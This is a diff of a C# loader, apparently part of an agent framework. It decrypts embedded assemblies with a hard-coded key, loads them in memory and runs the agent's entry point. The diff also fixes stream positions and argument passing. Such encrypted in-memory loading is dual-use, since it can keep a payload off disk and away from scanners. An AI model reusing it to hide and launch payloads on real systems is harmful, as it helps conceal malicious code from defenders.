@@ -1,4 +1,5 @@
 ﻿using Aegis.Models.Interfaces;
+using System.IO;
 using System.Reflection;
 using System.Runtime.Loader;
 
@@ -8,8 +9,8 @@ namespace Aegis.Loader
     {
         public async Task Go()
         {
-            string key = "%UUID%";
-            List<string> excludedDlls = new List<string>() { "Agent.bin", "Agent.Models.bin" };
+            string key = "c4620ccd8f564e17b3454dfe5668f91e";
+            List<string> excludedDlls = new List<string>() { "Aegis.Loader.Agent.bin", "Aegis.Loader.Agent.Models.bin" };
             var alc = AssemblyLoadContext.Default;
             var asmExe = Assembly.GetExecutingAssembly();
             Console.WriteLine("Getting Executing Assembly.");
@@ -19,36 +20,31 @@ namespace Aegis.Loader
             }
 
             List<string> sources = asmExe.GetManifestResourceNames().ToList();
-
-            foreach (var blah in sources)
-            {
-                Console.WriteLine(blah);
-            }
-            Console.WriteLine("Getting Models Dll");
-
             Stream modelStream = new MemoryStream();
-            if(!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains("Agent.Models.bin"))), modelStream, key)){
+            if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains("Agent.Models.bin"))), modelStream, key))
+            {
                 return;
             }
-
+            modelStream.Position = 0;
             alc.LoadFromStream(modelStream);
-
             //Load the rest of the DLLs except for the agent
             foreach (string aa in sources)
             {
+                Console.WriteLine(aa);
                 if (excludedDlls.Contains(aa))
                 {
                     continue;
                 }
-                Console.WriteLine($"Loading {aa}");
+
                 Stream s = new MemoryStream();
-                if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains("Agent.Models.bin"))), s, key))
+                if (!Getter.TryGet(asmExe.GetManifestResourceStream(sources.Find(item => item.Contains(aa))), s, key))
                 {
                     Environment.Exit(0);
                 }
 
                 if (s != null)
                 {
+                    s.Position = 0;
                     alc.LoadFromStream(s);
                 }
             }
@@ -63,13 +59,14 @@ namespace Aegis.Loader
             {
                 return;
             }
+            ad.Position = 0;
             agent = alc.LoadFromStream(ad);
             MethodInfo entryPoint = agent.EntryPoint;
 
             // Invoke the entry point method
             object[] parameters = new object[] { new string[0] }; // You can pass command-line arguments
             Console.WriteLine("Executing Agent.");
-            entryPoint.Invoke(null, null);
+            entryPoint.Invoke(null, parameters);
         }
     }
 }
